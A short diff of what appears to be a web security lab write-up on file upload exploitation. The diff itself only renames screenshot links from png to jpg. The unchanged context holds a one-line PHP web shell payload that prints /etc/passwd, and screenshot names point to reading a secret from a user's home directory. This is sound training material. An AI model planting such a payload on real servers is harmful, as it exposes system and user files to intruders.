@@ -77,10 +77,10 @@ remvove image data then add
 
 <?php echo file_get_contents('/etc/passwd'); ?>
 
-![screenshot](./images/lab1_etc_password_test_repeater.png)
+![screenshot](images/lab1_etc_password_test_repeater.jpg)
 
-![screenshot](./images/lab1_exploit_php_test.png)
+![screenshot](images/lab1_exploit_php_test.jpg)
 
-![screenshot](./images/lab1_home_carlos_secret.png)
+![screenshot](images/lab1_home_carlos_secret.jpg)
 
-![screenshot](./images/lab1_secrete_code.png)
+![screenshot](images/lab1_secrete_code.jpg)
